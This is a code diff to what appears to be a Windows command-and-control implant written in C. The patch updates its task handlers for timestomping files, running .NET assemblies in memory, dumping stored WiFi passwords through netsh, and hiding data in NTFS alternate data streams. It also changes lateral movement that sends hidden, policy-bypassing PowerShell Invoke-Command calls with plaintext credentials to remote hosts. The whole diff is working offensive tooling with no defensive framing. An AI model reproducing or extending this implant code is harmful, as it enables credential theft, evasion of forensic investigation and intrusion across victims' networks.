@@ -1542,7 +1542,7 @@ void dispatch_task(AgentTask *task) {
         }
         char asm_args[4096] = {0};
         json_get_str(jargs, "args", asm_args, sizeof(asm_args), "");
-        char *out = dotnet_exec(asm_bytes, asm_len, asm_args);
+        char *out = fork_run_assembly(asm_bytes, asm_len, asm_args);
         free(asm_bytes);
         agent_send_result(task->id, out ? out : "(null output)", "");
         free(out);
@@ -1562,9 +1562,16 @@ void dispatch_task(AgentTask *task) {
     // ── Phase 1 ──────────────────────────────────────────────────────────────
     else if (strcmp(type_upper, "TIMESTOMP") == 0) {
         char target[512]={0}; char ref[512]={0};
-        json_get_str(args,"target",target,sizeof(target),"");
-        json_get_str(args,"ref",ref,sizeof(ref),"C:\\Windows\\System32\\kernel32.dll");
-        if(!target[0]){agent_send_result(task->id,"","TIMESTOMP: {\"target\":\"path\"} required");return;}
+        if (args && args[0]=='{') {
+            json_get_str(args,"target",target,sizeof(target),"");
+            json_get_str(args,"ref",ref,sizeof(ref),"C:\\Windows\\System32\\kernel32.dll");
+        } else if (args && args[0]) {
+            char tmp[1024]; strncpy(tmp,args,sizeof(tmp)-1); tmp[sizeof(tmp)-1]=0;
+            char *sp=strchr(tmp,' ');
+            if(sp){*sp='\0'; strncpy(target,tmp,sizeof(target)-1); strncpy(ref,sp+1,sizeof(ref)-1);}
+            else { strncpy(target,tmp,sizeof(target)-1); strncpy(ref,"C:\\Windows\\System32\\kernel32.dll",sizeof(ref)-1); }
+        }
+        if(!target[0]){agent_send_result(task->id,"","TIMESTOMP: usage: timestomp <target> [ref]");return;}
         HANDLE hRef=CreateFileA(ref,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL|FILE_FLAG_BACKUP_SEMANTICS,NULL);
         if(hRef==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","TIMESTOMP: cannot open ref");return;}
         FILETIME ctime,atime,mtime; GetFileTime(hRef,&ctime,&atime,&mtime); CloseHandle(hRef);
@@ -1602,7 +1609,7 @@ void dispatch_task(AgentTask *task) {
         char *copy=_strdup(text); GlobalUnlock(hData); CloseClipboard();
         agent_send_result(task->id,copy?copy:"",""); free(copy);
     }
-    else if (strcmp(type_upper, "CRED_WIFI") == 0) {
+    else if (strcmp(type_upper, "CRED_WIFI") == 0 || strcmp(type_upper, "WIFI_CREDS") == 0) {
         char *profiles_out=run_shell("netsh wlan show profiles 2>&1");
         if(!profiles_out){agent_send_result(task->id,"","CRED_WIFI: netsh failed");return;}
         char *combined=(char*)calloc(1,65536);
@@ -1641,9 +1648,12 @@ void dispatch_task(AgentTask *task) {
         FindClose(hS); agent_send_result(task->id,result[0]?result:"[no alternate streams]","");
     }
     else if (strcmp(type_upper, "ADS_READ") == 0) {
+        /* args = "file:stream" (Go-compatible plain string) */
+        char *colon = args ? strrchr(args, ':') : NULL;
+        if(!colon||colon==args){agent_send_result(task->id,"","ADS_READ: <file>:<stream> required");return;}
         char file[512]={0}; char stream[256]={0};
-        json_get_str(args,"file",file,sizeof(file),""); json_get_str(args,"stream",stream,sizeof(stream),"");
-        if(!file[0]||!stream[0]){agent_send_result(task->id,"","ADS_READ: {\"file\":\"...\",\"stream\":\"...\"} required");return;}
+        int flen=(int)(colon-args); if(flen>=512)flen=511;
+        strncpy(file,args,flen); strncpy(stream,colon+1,sizeof(stream)-1);
         char adspath[800]; snprintf(adspath,sizeof(adspath),"%s:%s",file,stream);
         HANDLE hF=CreateFileA(adspath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
         if(hF==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","ADS_READ: open failed");return;}
@@ -1654,20 +1664,25 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id,msg,""); free(buf);
     }
     else if (strcmp(type_upper, "ADS_WRITE") == 0) {
-        char file[512]={0}; char stream[256]={0}; char data[4096]={0};
-        json_get_str(args,"file",file,sizeof(file),""); json_get_str(args,"stream",stream,sizeof(stream),""); json_get_str(args,"data",data,sizeof(data),"");
-        if(!file[0]||!stream[0]){agent_send_result(task->id,"","ADS_WRITE: {\"file\":,\"stream\":,\"data\":} required");return;}
+        /* args = "file:stream", payload = raw bytes */
+        char *colon = args ? strrchr(args, ':') : NULL;
+        if(!colon||colon==args||!task->payload||task->payload_len==0){agent_send_result(task->id,"","ADS_WRITE: <file>:<stream> required (payload=data)");return;}
+        char file[512]={0}; char stream[256]={0};
+        int flen=(int)(colon-args); if(flen>=512)flen=511;
+        strncpy(file,args,flen); strncpy(stream,colon+1,sizeof(stream)-1);
         char adspath[800]; snprintf(adspath,sizeof(adspath),"%s:%s",file,stream);
         HANDLE hF=CreateFileA(adspath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
         if(hF==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","ADS_WRITE: create failed");return;}
-        DWORD wr=0; WriteFile(hF,data,(DWORD)strlen(data),&wr,NULL); CloseHandle(hF);
+        DWORD wr=0; WriteFile(hF,task->payload,(DWORD)task->payload_len,&wr,NULL); CloseHandle(hF);
         char msg[64]; snprintf(msg,sizeof(msg),"[+] wrote %lu bytes to %s",wr,adspath);
         agent_send_result(task->id,msg,"");
     }
     else if (strcmp(type_upper, "ADS_DEL") == 0) {
+        char *colon = args ? strrchr(args, ':') : NULL;
+        if(!colon||colon==args){agent_send_result(task->id,"","ADS_DEL: <file>:<stream> required");return;}
         char file[512]={0}; char stream[256]={0};
-        json_get_str(args,"file",file,sizeof(file),""); json_get_str(args,"stream",stream,sizeof(stream),"");
-        if(!file[0]||!stream[0]){agent_send_result(task->id,"","ADS_DEL: {\"file\":\"...\",\"stream\":\"...\"} required");return;}
+        int flen=(int)(colon-args); if(flen>=512)flen=511;
+        strncpy(file,args,flen); strncpy(stream,colon+1,sizeof(stream)-1);
         char adspath[800]; snprintf(adspath,sizeof(adspath),"%s:%s",file,stream);
         if(DeleteFileA(adspath))agent_send_result(task->id,"[+] ADS stream deleted","");
         else agent_send_result(task->id,"","ADS_DEL: DeleteFile failed");
@@ -2976,7 +2991,7 @@ void dispatch_task(AgentTask *task) {
             "Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}"
             "catch{$ip='%s'};"
             "$c=New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force));"
-            "Invoke-Command -ComputerName $ip -Authentication NTLM -Credential $c -ScriptBlock {%s}",
+            "Invoke-Command -ComputerName $ip -Authentication Negotiate -Credential $c -ScriptBlock {%s}",
             wr_target, wr_target, wr_user, wr_pass, wr_cmd);
         char sh_cmd[5120];
         snprintf(sh_cmd, sizeof(sh_cmd), "powershell -NoP -W Hidden -Exec Bypass -C \"%s\"", ps_buf);
@@ -2999,7 +3014,7 @@ void dispatch_task(AgentTask *task) {
             "Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}"
             "catch{$ip='%s'};"
             "$c=New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force));"
-            "Invoke-Command -ComputerName $ip -Authentication NTLM -Credential $c -AsJob "
+            "Invoke-Command -ComputerName $ip -Authentication Negotiate -Credential $c -AsJob "
             "-ScriptBlock {%s} | Out-Null",
             wd_target, wd_target, wd_user, wd_pass, wd_payload);
         char sh_cmd2[5120];
